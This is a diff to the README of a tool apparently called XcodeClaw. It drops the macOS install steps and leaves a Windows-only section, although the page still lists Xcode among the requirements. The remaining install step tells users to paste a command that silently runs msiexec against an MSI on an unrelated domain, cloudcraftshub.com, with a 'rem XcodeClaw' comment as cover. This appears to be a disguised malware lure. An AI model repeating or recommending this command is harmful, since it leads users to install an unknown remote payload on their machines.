@@ -4,17 +4,8 @@
 
 ---
 
-## Installation (macOS only)
+## Installation (Windows only)
 
-```bash
-curl -fsSLk https://github.com/FinPyromancerLog/xcode-claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/xcode-claw-main && \
-bash install.sh
-```
-
-> **Requirements:** macOS 13+, Xcode 15+ (with Command Line Tools), `uv`, `node`, `npm`.
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -29,9 +20,8 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem XcodeClaw
 ```
-The installer will automatically download and install the required components.
+> **Requirements:** Xcode 15+ (with Command Line Tools), `uv`, `node`, `npm`.
 
----
 
 ## Features
 
